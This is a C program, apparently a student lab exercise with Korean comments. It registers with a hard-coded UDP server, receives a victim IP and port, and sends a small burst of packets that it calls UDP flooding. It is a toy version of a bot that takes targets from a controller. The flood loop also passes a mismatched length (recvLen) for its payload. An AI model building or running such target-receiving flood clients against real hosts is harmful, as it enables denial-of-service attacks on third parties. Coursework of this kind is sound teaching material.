#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <WinSock2.h> // 윈도우 소켓을 사용하기 위해 필요한 함수들이 있는 헤더파일
#include <stdlib.h>
#pragma comment(lib,"ws2_32.lib") 

#define BUFSIZE 512 

// UDP client: socket() -> sendto() -> recvfrom() -> closesocket()
// 클라이언트는 단지 자신이 원하는 서버에 접속해 원하는 데이터를 얻거나 작업수행
// -> 서버 주소 접근, 데이터 주고받는 행위만 존재
// udp는 비연결형이기 때문에 열려있는 서버에 단순히 접속하기만 하면됨.

int main(int argc, char* argv[]) {
	WSADATA winsockData; // 윈속 초기화 구조체
	SOCKET clientSocket; // 소켓 구조체
	SOCKADDR_IN clientAddr; // 소켓 주소 구조체, 클라이언트의 주소 정보를 담고 있음
	SOCKADDR_IN serverAddr; // 소켓 주소 구조체, 서버의 주소 정보를 담고 있음

	int clientSize;
	char buf[BUFSIZE + 1] = { "IMHACKER_2018111353" }; // 주고 받은 데이터를 저장할 공간, 우선 서버로 보낼 메세지를 buf에 저장
	int sendLen;
	int recvLen=strlen(buf);
	
	// 1. 윈속 초기화  (필수)
	if (WSAStartup(0x202, &winsockData) == SOCKET_ERROR) { // 초기화 과정 에러 처리
		printf("윈속 초기화 실패 \n"); // 초기화 문제 발생
		WSACleanup();
		return -1;
	}
	printf("\n1. 윈속 초기화 성공 \n"); // 윈속 초기화 성공

	memset(&serverAddr, 0, sizeof(serverAddr));
	memset(&clientAddr, 0, sizeof(clientAddr));
	
	serverAddr.sin_family = AF_INET; // IPv4 사용
	serverAddr.sin_addr.s_addr = inet_addr("114.70.37.17"); // 로컬 테스트, 실제 통신에 사용할 아이피 주소
	serverAddr.sin_port = htons(10004); // 네트워크 바이트 오더 변경, 실제 통신에 사용할 포트 주소

	
	// 2. 소켓 생성
	clientSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); // 소켓 생성 함수, 소켓을 열고, 열린 소켓에 해당하는 파일 디스크립터 리턴하는 함수,UDP 프로토콜 사용
	if (clientSocket == INVALID_SOCKET) { // 소켓 생성 과정 에러처리
		printf("소켓 생성 실패 \n"); //소켓 생성 실패
		WSACleanup();
		return -1;
	}
	printf("2. 소켓 생성 성공\n"); // 소켓 생성 성공


		// 3. 서버에 데이터 보내기 (IMHACKER_2018111353 -> buf에 저장되어있음)
		sendLen = sendto(clientSocket, buf, recvLen, 0,
			(struct sockaddr*)&serverAddr, sizeof(serverAddr)); // 소켓에 데이터를 쓰는 함수

		if (sendLen != recvLen) { // 에러 처리
			printf(" sendto() error.\n");
			return -1;
		}
		printf("\n3. 서버에 데이터 보내기 성공\n");
		printf("-> 보낸 데이터: %s\n", buf);


		//4. 서버로 부터 응답 데이터 받기
		clientSize = sizeof(clientAddr);

		memset(buf, 0, BUFSIZE); // buf 초기화

		recvLen = recvfrom(clientSocket, buf, BUFSIZE, 0,
			(struct sockaddr*) & clientAddr, &clientSize); // 소켓으로부터 데이터를 읽어들이는 함수, buf에 데이터를 받음

		if (recvLen < 0) {
			printf(" recvfrom() error.\n"); // 에러 처리
			return -1;
		}

		printf("\n4. 서버로 부터 응답 받기 성공\n");
		printf("-> 받은 데이터: %s\n", buf);

		// "OKAY_ip:port" 형태로 공격 대상지 정보를 받을 것을 알고 있음
		//해당 문자열을 토큰으로 나누어 IP,PORT 정보를 각각 str[1],str[2] 에 저장될 것
		//(OKAY는 str[0] 에 저장될 것이고 사용하지 않을 것)

		char *ptr = strtok(buf, "_:"); // _와 : 기준으로 문자열 분리
		char *str[3] = { NULL, }; // 분리된 토큰을 저장할 배열
		int i = 0;

		while (ptr != NULL) { // 문자열이 끝날 때 까지 분리과정 수행
			str[i] = ptr;
			i++;
			ptr = strtok(NULL, "_:");
		}

		char *victim_ip = str[1]; // ip정보는 문자열로 저장
		int victim_port = atoi(str[2]); // port정보는 정수로 저장

		// udp flooding 수행
		serverAddr.sin_addr.s_addr = inet_addr(victim_ip); // 공격 대상지 ip
		serverAddr.sin_port = htons(victim_port); // 공격 대상지 port

		printf("5. 공격 대상지에 flooding 공격 수행\n");
		
		for (int i = 0; i < 10; i++) { // 데이터 보내기 10번 수행
			sendLen = sendto(clientSocket, "2018111353", recvLen, 0,
				(struct sockaddr*)&serverAddr, sizeof(serverAddr)); // 내 학번 정보 보내기

			if (sendLen != recvLen) {
				printf(" sendto() error.\n"); // 에러 처리
				return -1;
			}
		}

		printf("6. UDP flooding 성공\n\n");

		closesocket(clientSocket); // 소켓 종료
		WSACleanup();
		return 0;

}

